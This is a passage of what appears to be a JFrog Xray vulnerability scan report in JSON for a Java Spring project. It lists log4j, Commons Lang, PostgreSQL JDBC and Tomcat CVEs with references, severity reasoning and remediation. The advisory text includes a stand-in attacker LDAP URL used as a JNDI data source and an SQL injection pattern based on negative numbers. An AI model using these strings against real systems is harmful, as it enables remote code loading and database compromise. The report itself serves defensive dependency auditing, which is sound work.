          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/T57MPJUW3MA6QGWZRTMCHHMMPQNVKGFC",
          "https://security.netapp.com/advisory/ntap-20220104-0001/",
          "https://cert-portal.siemens.com/productcert/pdf/ssa-784507.pdf",
          "https://lists.apache.org/thread/s1o5vlo78ypqxnzn6p8zf6t9shtq5143",
          "https://www.oracle.com/security-alerts/cpujul2022.html",
          "https://security.netapp.com/advisory/ntap-20220104-0001",
          "https://www.oracle.com/security-alerts/cpuapr2022.html",
          "http://www.openwall.com/lists/oss-security/2021/12/28/1",
          "https://www.oracle.com/security-alerts/cpujan2022.html",
          "https://lists.debian.org/debian-lts-announce/2021/12/msg00036.html",
          "https://issues.apache.org/jira/browse/LOG4J2-3293",
          "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-apache-log4j-qRuKNEbd",
          "https://nvd.nist.gov/vuln/detail/CVE-2021-44832",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/EVV25FXL4FU5X6X5BSL7RLQ7T6F65MRA",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/EVV25FXL4FU5X6X5BSL7RLQ7T6F65MRA/"
        ],
        "extended_information": {
          "short_description": "Unsafe class loading in log4j JDBCAppender leads to code execution when using an attacker-supplied configuration.",
          "full_description": "The vulnerability is caused due to the `JDBCAppender` accepting a JNDI data source in its DataSource attribute.\nWhen accessing a JNDI data source, remote protocols (such as LDAP) are still available, which means that specifying a string such as `ldap://attacker.com:1337` will cause the vulnerable app to contact the attacker’s server, which can provide a remote class or serialized object to load.\nCurrently, exploitation of the vulnerability is possible only if the attacker has direct control of Log4J’s configuration file, and specifically if the attacker can add a `JDBCAppender` with arbitrary attributes.",
          "jfrog_research_severity": "Low",
          "jfrog_research_severity_reasons": [
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must understand which remote input allows controlling the log4j configuration (specifically adding a `JDBCAppender`)",
              "is_positive": true
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)"
            },
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "It is extremely unlikely that an attacker will be able to control the needed parts of the log4j configuration",
              "is_positive": true
            },
            {
              "name": "The issue has an exploit published"
            }
          ],
          "remediation": "##### Development mitigations\n\nRemove the `JdbcAppender` class statically from the JAR file by running `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/appender/db/jdbc/JdbcAppender.class`"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2020-9488",
            "cvss_v2_score": "4.3",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:N/A:N",
            "cvss_v3_score": "3.7",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
            "cwe": [
              "CWE-295"
            ]
          }
        ],
        "summary": "Improper validation of certificate with host mismatch in Apache Log4j SMTP appender. This could allow an SMTPS connection to be intercepted by a man-in-the-middle attack which could leak any log messages sent through that appender. Fixed in Apache Log4j 2.12.3 and 2.13.1",
        "severity": "Low",
        "components": {
          "gav://org.apache.logging.log4j:log4j-core:2.11.2": {
            "fixed_versions": [
              "[2.12.3]",
              "[2.13.2]",
              "[2.3.2]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.apache.logging.log4j:log4j-core:2.11.2"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.apache.logging.log4j:log4j-slf4j-impl:2.14.1"
                },
                {
                  "component_id": "gav://org.apache.logging.log4j:log4j-core:2.11.2"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-96751",
        "references": [
          "https://nvd.nist.gov/vuln/detail/CVE-2020-9488",
          "https://lists.apache.org/thread.html/r393943de452406f0f6f4b3def9f8d3c071f96323c1f6ed1a098f7fe4@%3Ctorque-dev.db.apache.org%3E",
          "https://lists.apache.org/thread.html/r9a79175c393d14d760a0ae3731b4a873230a16ef321aa9ca48a810cd%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/re024d86dffa72ad800f2848d0c77ed93f0b78ee808350b477a6ed987%40%3Cgitbox.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/r8e96c340004b7898cad3204ea51280ef6e4b553a684e1452bf1b18b1%40%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r2721aba31a8562639c4b937150897e24f78f747cdbda8641c0f659fe@%3Cusers.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/ra632b329b2ae2324fabbad5da204c4ec2e171ff60348ec4ba698fd40%40%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/r7e739f2961753af95e2a3a637828fb88bfca68e5d6b0221d483a9ee5@%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r4285398e5585a0456d3d9db021a4fce6e6fcf3ec027dfa13a450ec98@%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rd8e87c4d69df335d0ba7d815b63be8bd8a6352f429765c52eb07ddac@%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r1fc73f0e16ec2fa249d3ad39a5194afb9cc5afb4c023dc0bab5a5881%40%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/r5a68258e5ab12532dc179edae3d6e87037fa3b50ab9d63a90c432507%40%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/r7641ee788e1eb1be4bb206a7d15f8a64ec6ef23e5ec6132d5a567695%40%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r7641ee788e1eb1be4bb206a7d15f8a64ec6ef23e5ec6132d5a567695@%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r393943de452406f0f6f4b3def9f8d3c071f96323c1f6ed1a098f7fe4%40%3Ctorque-dev.db.apache.org%3E",
          "https://lists.apache.org/thread.html/ra051e07a0eea4943fa104247e69596f094951f51512d42c924e86c75@%3Cissues.hive.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpujan2021.html",
          "https://lists.apache.org/thread.html/r65578f3761a89bc164e8964acd5d913b9f8fd997967b195a89a97ca3%40%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/rbc45eb0f53fd6242af3e666c2189464f848a851d408289840cecc6e3@%3Ccommits.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rc6b81c013618d1de1b5d6b8c1088aaf87b4bacc10c2371f15a566701%40%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rd0e44e8ef71eeaaa3cf3d1b8b41eb25894372e2995ec908ce7624d26%40%3Ccommits.pulsar.apache.org%3E",
          "https://lists.apache.org/thread.html/rd5d58088812cf8e677d99b07f73c654014c524c94e7fedbdee047604%40%3Ctorque-dev.db.apache.org%3E",
          "https://lists.apache.org/thread.html/r4d5dc9f3520071338d9ebc26f9f158a43ae28a91923d176b550a807b@%3Cdev.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/r4285398e5585a0456d3d9db021a4fce6e6fcf3ec027dfa13a450ec98%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r9776e71e3c67c5d13a91c1eba0dc025b48b802eb7561cc6956d6961c@%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/r0a2699f724156a558afd1abb6c044fb9132caa66dce861b82699722a%40%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/rc6b81c013618d1de1b5d6b8c1088aaf87b4bacc10c2371f15a566701@%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r8c001b9a95c0bbec06f4457721edd94935a55932e64b82cc5582b846%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rf9fa47ab66495c78bb4120b0754dd9531ca2ff0430f6685ac9b07772%40%3Cdev.mina.apache.org%3E",
          "https://lists.apache.org/thread.html/rbc7642b9800249553f13457e46b813bea1aec99d2bc9106510e00ff3%40%3Ctorque-dev.db.apache.org%3E",
          "https://lists.apache.org/thread.html/r2f209d271349bafd91537a558a279c08ebcff8fa3e547357d58833e6@%3Cdev.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r22a56beb76dd8cf18e24fda9072f1e05990f49d6439662d3782a392f%40%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/r3d1d00441c55144a4013adda74b051ae7864128ebcfb6ee9721a2eb3@%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/re024d86dffa72ad800f2848d0c77ed93f0b78ee808350b477a6ed987@%3Cgitbox.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/rbc7642b9800249553f13457e46b813bea1aec99d2bc9106510e00ff3@%3Ctorque-dev.db.apache.org%3E",
          "https://lists.apache.org/thread.html/rd0e44e8ef71eeaaa3cf3d1b8b41eb25894372e2995ec908ce7624d26@%3Ccommits.pulsar.apache.org%3E",
          "https://lists.apache.org/thread.html/r0a2699f724156a558afd1abb6c044fb9132caa66dce861b82699722a@%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/rc2dbc4633a6eea1fcbce6831876cfa17b73759a98c65326d1896cb1a@%3Ctorque-dev.db.apache.org%3E",
          "https://lists.apache.org/thread.html/r48efc7cb5aeb4e1f67aaa06fb4b5479a5635d12f07d0b93fc2d08809%40%3Ccommits.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rd8e87c4d69df335d0ba7d815b63be8bd8a6352f429765c52eb07ddac%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rbc45eb0f53fd6242af3e666c2189464f848a851d408289840cecc6e3%40%3Ccommits.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r3d1d00441c55144a4013adda74b051ae7864128ebcfb6ee9721a2eb3%40%3Cissues.hive.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpuoct2021.html",
          "https://lists.apache.org/thread.html/rf1c2a81a08034c688b8f15cf58a4cfab322d00002ca46d20133bee20%40%3Cdev.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r33864a0fc171c1c4bf680645ebb6d4f8057899ab294a43e1e4fe9d04%40%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/r7e739f2961753af95e2a3a637828fb88bfca68e5d6b0221d483a9ee5%40%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r8e96c340004b7898cad3204ea51280ef6e4b553a684e1452bf1b18b1@%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/rf1c2a81a08034c688b8f15cf58a4cfab322d00002ca46d20133bee20@%3Cdev.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r7e5c10534ed06bf805473ac85e8412fe3908a8fa4cabf5027bf11220%40%3Cdev.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r7e5c10534ed06bf805473ac85e8412fe3908a8fa4cabf5027bf11220@%3Cdev.kafka.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpuapr2022.html",
          "https://lists.apache.org/thread.html/r0df3d7a5acb98c57e64ab9266aa21eeee1d9b399addb96f9cf1cbe05@%3Cdev.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r48bcd06049c1779ef709564544c3d8a32ae6ee5c3b7281a606ac4463%40%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r9776e71e3c67c5d13a91c1eba0dc025b48b802eb7561cc6956d6961c%40%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/r48efc7cb5aeb4e1f67aaa06fb4b5479a5635d12f07d0b93fc2d08809@%3Ccommits.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r4db540cafc5d7232c62e076051ef661d37d345015b2e59b3f81a932f%40%3Cdev.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/rec34b1cccf907898e7cb36051ffac3ccf1ea89d0b261a2a3b3fb267f%40%3Ccommits.zookeeper.apache.org%3E",
          "https://issues.apache.org/jira/browse/LOG4J2-2819",
          "https://lists.apache.org/thread.html/r4db540cafc5d7232c62e076051ef661d37d345015b2e59b3f81a932f@%3Cdev.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/r48bcd06049c1779ef709564544c3d8a32ae6ee5c3b7281a606ac4463@%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/rd5d58088812cf8e677d99b07f73c654014c524c94e7fedbdee047604@%3Ctorque-dev.db.apache.org%3E",
          "https://lists.apache.org/thread.html/rf9fa47ab66495c78bb4120b0754dd9531ca2ff0430f6685ac9b07772@%3Cdev.mina.apache.org%3E",
          "https://lists.apache.org/thread.html/r22a56beb76dd8cf18e24fda9072f1e05990f49d6439662d3782a392f@%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/rd55f65c6822ff235eda435d31488cfbb9aa7055cdf47481ebee777cc%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r2721aba31a8562639c4b937150897e24f78f747cdbda8641c0f659fe%40%3Cusers.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r1fc73f0e16ec2fa249d3ad39a5194afb9cc5afb4c023dc0bab5a5881@%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/r8c001b9a95c0bbec06f4457721edd94935a55932e64b82cc5582b846@%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r4ed1f49616a8603832d378cb9d13e7a8b9b27972bb46d946ccd8491f@%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/r33864a0fc171c1c4bf680645ebb6d4f8057899ab294a43e1e4fe9d04@%3Cissues.hive.apache.org%3E",
          "https://lists.debian.org/debian-lts-announce/2021/12/msg00017.html",
          "https://www.oracle.com/security-alerts/cpujul2020.html",
          "https://github.com/advisories/GHSA-vwqq-5vrc-xw9h",
          "https://lists.apache.org/thread.html/r4ed1f49616a8603832d378cb9d13e7a8b9b27972bb46d946ccd8491f%40%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/ra051e07a0eea4943fa104247e69596f094951f51512d42c924e86c75%40%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/r4d5dc9f3520071338d9ebc26f9f158a43ae28a91923d176b550a807b%40%3Cdev.hive.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpuApr2021.html",
          "https://lists.apache.org/thread.html/ra632b329b2ae2324fabbad5da204c4ec2e171ff60348ec4ba698fd40@%3Cissues.hive.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpuoct2020.html",
          "https://www.debian.org/security/2021/dsa-5020",
          "https://security.netapp.com/advisory/ntap-20200504-0003/",
          "https://lists.apache.org/thread.html/rc2dbc4633a6eea1fcbce6831876cfa17b73759a98c65326d1896cb1a%40%3Ctorque-dev.db.apache.org%3E",
          "https://lists.apache.org/thread.html/r9a79175c393d14d760a0ae3731b4a873230a16ef321aa9ca48a810cd@%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rec34b1cccf907898e7cb36051ffac3ccf1ea89d0b261a2a3b3fb267f@%3Ccommits.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r45916179811a32cbaa500f972de9098e6ee80ee81c7f134fce83e03a%40%3Cissues.flink.apache.org%3E",
          "https://lists.apache.org/thread.html/r45916179811a32cbaa500f972de9098e6ee80ee81c7f134fce83e03a@%3Cissues.flink.apache.org%3E",
          "https://lists.apache.org/thread.html/r65578f3761a89bc164e8964acd5d913b9f8fd997967b195a89a97ca3@%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/r2f209d271349bafd91537a558a279c08ebcff8fa3e547357d58833e6%40%3Cdev.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r5a68258e5ab12532dc179edae3d6e87037fa3b50ab9d63a90c432507@%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/r0df3d7a5acb98c57e64ab9266aa21eeee1d9b399addb96f9cf1cbe05%40%3Cdev.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rd55f65c6822ff235eda435d31488cfbb9aa7055cdf47481ebee777cc@%3Cissues.zookeeper.apache.org%3E"
        ],
        "extended_information": {}
      },
      {
        "cves": [
          {
            "cve": "CVE-2025-48924",
            "cvss_v3_score": "6.5",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
            "cwe": [
              "CWE-674"
            ]
          }
        ],
        "summary": "Uncontrolled Recursion vulnerability in Apache Commons Lang.\n\nThis issue affects Apache Commons Lang: Starting with commons-lang:commons-lang 2.0 to 2.6, and, from org.apache.commons:commons-lang3 3.0 before 3.18.0.\n\nThe methods ClassUtils.getClass(...) can throw StackOverflowError on very long inputs. Because an Error is usually not handled by applications and libraries, a \nStackOverflowError could cause an application to stop.\n\nUsers are recommended to upgrade to version 3.18.0, which fixes the issue.",
        "severity": "Medium",
        "components": {
          "gav://org.apache.commons:commons-lang3:3.12.0": {
            "fixed_versions": [
              "[3.18.0]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.apache.commons:commons-compress:1.27.1"
                },
                {
                  "component_id": "gav://org.apache.commons:commons-lang3:3.12.0"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-common:1.8.0"
                },
                {
                  "component_id": "gav://io.swagger.core.v3:swagger-core:2.2.20"
                },
                {
                  "component_id": "gav://org.apache.commons:commons-lang3:3.12.0"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-710140",
        "references": [
          "https://github.com/advisories/GHSA-j288-q9x7-2f5v",
          "https://github.com/apache/commons-lang/commit/b424803abdb2bec818e4fbcb251ce031c22aca53",
          "https://nvd.nist.gov/vuln/detail/CVE-2025-48924",
          "https://lists.apache.org/thread/bgv0lpswokgol11tloxnjfzdl7yrc1g1"
        ],
        "extended_information": {}
      },
      {
        "cves": [
          {
            "cve": "CVE-2024-1597",
            "cvss_v3_score": "9.8",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-89"
            ]
          }
        ],
        "summary": "pgjdbc, the PostgreSQL JDBC Driver, allows attacker to inject SQL if using PreferQueryMode=SIMPLE. Note this is not the default. In the default mode there is no vulnerability. A placeholder for a numeric value must be immediately preceded by a minus. There must be a second placeholder for a string value after the first placeholder; both must be on the same line. By constructing a matching string payload, the attacker can inject SQL to alter the query,bypassing the protections that parameterized queries bring against SQL Injection attacks. Versions before 42.7.2, 42.6.1, 42.5.5, 42.4.4, 42.3.9, and 42.2.28 are affected.",
        "severity": "Critical",
        "components": {
          "gav://org.postgresql:postgresql:42.3.8": {
            "fixed_versions": [
              "[42.2.28]",
              "[42.3.9]",
              "[42.4.4]",
              "[42.5.5]",
              "[42.6.1]",
              "[42.7.2]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.postgresql:postgresql:42.3.8"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-590941",
        "references": [
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/TZQTSMESZD2RJ5XBPSXH3TIQVUW5DIUU/",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/TZQTSMESZD2RJ5XBPSXH3TIQVUW5DIUU",
          "https://github.com/advisories/GHSA-24rp-q3w6-vc56",
          "https://github.com/pgjdbc/pgjdbc/commit/93b0fcb2711d9c1e3a2a03134369738a02a58b40",
          "https://github.com/pgjdbc/pgjdbc/security/advisories/GHSA-24rp-q3w6-vc56",
          "https://www.sonarsource.com/blog/double-dash-double-trouble-a-subtle-sql-injection-flaw/",
          "https://security.netapp.com/advisory/ntap-20240419-0008",
          "https://www.enterprisedb.com/docs/jdbc_connector/latest/01_jdbc_rel_notes/",
          "https://github.com/pgjdbc/pgjdbc/commit/06abfb78a627277a580d4df825f210e96a4e14ee",
          "https://github.com/advisories/GHSA-xfg6-62px-cxc2",
          "https://security.netapp.com/advisory/ntap-20240419-0008/",
          "https://www.enterprisedb.com/docs/security/assessments/cve-2024-1597",
          "https://lists.debian.org/debian-lts-announce/2024/05/msg00007.html",
          "http://www.openwall.com/lists/oss-security/2024/04/02/6",
          "https://www.enterprisedb.com/docs/security/assessments/cve-2024-1597/",
          "https://nvd.nist.gov/vuln/detail/CVE-2024-1597",
          "https://www.enterprisedb.com/docs/jdbc_connector/latest/01_jdbc_rel_notes"
        ],
        "extended_information": {
          "short_description": "Improper escaping of numeric values in PostgreSQL JDBC Driver may lead to SQL injection when using a non-default query mode.",
          "full_description": "[PostgreSQL](https://www.postgresql.org/) is a relational database management system (RDBMS) that uses and extends the SQL language combined with many features that safely store and scale the most complicated data workloads.\n\nThe [PostgreSQL JDBC Driver](https://jdbc.postgresql.org/) allows Java programs to connect to a PostgreSQL database using standard, database independent Java code.\n\nThere are different modes for executing queries on a database: `extended` (which is the default), `extendForPrepared`, `extendedCacheEverything` and `simple`.\nIn the `simple` mode, the frontend just sends a textual query string, which is parsed and immediately executed by the backend.\n\nTo be affected, the victim must use the non-default `simple` query mode when connecting to the database by adding it to the JDBC connection string, which is highly unlikely to be used.\nAn example of a connection string that uses this mode: `jdbc:postgresql://localhost:5432/?preferQueryMode=simple`.\n\nAttackers can exploit the vulnerability to cause an unexpected behavior or to perform SQL Injection.\n\nTo perform unexpected behavior the affected code must have an SQL query that contains `-` (minus) and an attacker-controlled numeric variable. This is due to PostgreSQL treating these variables as literals and not escaping them.\nFor example: `SELECT -? FROM tablename`.\nThe attacker will need to insert a negative number (that starts with `-`), which will cause PostgreSQL to treat it as a comment (double-minus: `--`).\nFor example, a `-3` number will cause the query to be parsed as: `SELECT --3 FROM tablename`, which will cause unexpected behavior.\n\nAn SQL injection is also possible if a query like this includes an attacker-controlled string after the numeric variable as well and is on the same line.\nFor example: `SELECT -?, ? FROM tablename`.\nWhen inserting a negative number, the attackers can insert a string that contains the SQL query they wish to execute.\n\nTo successfully trigger the vulnerability, all of the following conditions must be satisfied:\n1. A Non-default query mode (`?preferQueryMode=simple` at the end of the the JDBC connection string), which is highly unlikely.\n2. SQL query with two attacker-controlled variables (one numeric and one string in the same line). The string variable must be after the numeric one.\n3. The SQL query must contain \"-\" before and adjacent to the numeric variable (for example, `SELECT -?, ? FROM tablename`)",
          "jfrog_research_severity": "Medium",
          "jfrog_research_severity_reasons": [
            {
              "name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
              "description": "The CVSS does not reflect the contextual prerequisites required to exploit the vulnerability.",
              "is_positive": true
            },
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "To successfully trigger the vulnerability, all of the following conditions must be satisfied:\n1. A Non-default query mode (`?preferQueryMode=simple` at the end of the JDBC connection string), which is highly unlikely.\n2. SQL query with two attacker-controlled variables (one numeric and one string in the same line). The string variable must be after the numeric one.\n3. The SQL query must contain \"-\" before and adjacent to the numeric variable (for example, `SELECT -?, ? FROM tablename`).",
              "is_positive": true
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "Leads to SQL injection."
            },
            {
              "name": "The issue has an exploit published",
              "description": "Tests that trigger this issue were published along with the official fix commit."
            }
          ],
          "remediation": "##### Development mitigations\n\nIf your SQL query contains a minus (`-`) followed by a numeric variable that is user-controlled, verify the number is not a negative number before passing it to the prepared statement (for example, the `java.sql.PreparedStatement.setInt` function).\nAlternatively, don't use the `preferQueryMode=simple` mode."
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2025-48989",
            "cvss_v3_score": "7.5",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cwe": [
              "CWE-404"
            ]
          }
        ],
        "summary": "Improper Resource Shutdown or Release vulnerability in Apache Tomcat made Tomcat vulnerable to the made you reset attack.\n\nThis issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.9, from 10.1.0-M1 through 10.1.43 and from 9.0.0.M1 through 9.0.107. Older, EOL versions may also be affected.\n\nUsers are recommended to upgrade to one of versions 11.0.10, 10.1.44 or 9.0.108 which fix the issue.",
        "severity": "High",
        "components": {
          "gav://org.apache.tomcat.embed:tomcat-embed-core:9.0.83": {
            "fixed_versions": [
              "[10.1.44]",
              "[11.0.10]",
              "[9.0.108]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-tomcat:2.7.18"
                },
                {
                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-core:9.0.83"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-tomcat:2.7.18"
                },
                {
                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-websocket:9.0.83"
                },
                {
                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-core:9.0.83"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-714352",
        "references": [
          "https://tomcat.apache.org/security-11.html",
          "https://tomcat.apache.org/security-10.html",
          "https://tomcat.apache.org/security-9.html",
          "https://github.com/advisories/GHSA-gqp3-2cvr-x8m3",
          "https://lists.apache.org/thread/9ydfg0xr0tchmglcprhxgwhj0hfwxlyf",
          "https://nvd.nist.gov/vuln/detail/CVE-2025-48989",
          "https://github.com/apache/tomcat/commit/73c04a10395774bda71a0b37802cf983662ce255",
          "https://github.com/apache/tomcat/commit/f362c8eb3b8ec5b7f312f7f5610731c0fb299a06",
          "https://github.com/apache/tomcat/commit/f36b8a4eea4ce8a0bc035079e1d259d29f5eb7bf"
        ],
        "extended_information": {}
      },
      {
        "cves": [
          {
            "cve": "CVE-2025-49125",
            "cvss_v3_score": "7.5",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
            "cwe": [
              "CWE-288"
            ]
          }
        ],
        "summary": "Authentication Bypass Using an Alternate Path or Channel vulnerability in Apache Tomcat.  When using PreResources or PostResources mounted other than at the root of the web application, it was possible to access those resources via an unexpected path. That path was likely not to be protected by the same security constraints as the expected path, allowing those security constraints to be bypassed.\n\nThis issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.7, from 10.1.0-M1 through 10.1.41, from 9.0.0.M1 through 9.0.105.\nThe following versions were EOL at the time the CVE was created but are \nknown to be affected: 8.5.0 through 8.5.100. Other, older, EOL versions \nmay also be affected.\n\n\nUsers are recommended to upgrade to version 11.0.8, 10.1.42 or 9.0.106, which fix the issue.",
        "severity": "Medium",
        "components": {
          "gav://org.apache.tomcat.embed:tomcat-embed-core:9.0.83": {
            "fixed_versions": [
              "[10.1.42]",
              "[11.0.8]",
              "[9.0.106]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-tomcat:2.7.18"
                },
                {
                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-core:9.0.83"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-tomcat:2.7.18"
                },
                {
                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-websocket:9.0.83"
                },
                {
                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-core:9.0.83"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-704764",
        "references": [
          "https://tomcat.apache.org/security-9.html",
          "https://lists.apache.org/thread/m66cytbfrty9k7dc4cg6tl1czhsnbywk",
          "https://github.com/apache/tomcat/commit/7617b9c247bc77ed0444dd69adcd8aa48777886c",
          "https://nvd.nist.gov/vuln/detail/CVE-2025-49125",
          "https://github.com/apache/tomcat/commit/d94bd36fb7eb32e790dae0339bc249069649a637",
          "https://tomcat.apache.org/security-11.html",
          "http://www.openwall.com/lists/oss-security/2025/06/16/2",
          "https://github.com/apache/tomcat/commit/9418e3ff9f1f4c006b4661311ae9376c52d162b9",
          "https://github.com/advisories/GHSA-wc4r-xq3c-5cf3",
          "https://tomcat.apache.org/security-10.html"
        ],
        "extended_information": {}
      },
      {
        "cves": [
          {
            "cve": "CVE-2024-24549",
            "cvss_v3_score": "7.5",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cwe": [
              "NVD-CWE-noinfo",
              "CWE-20"
            ]
          }
        ],
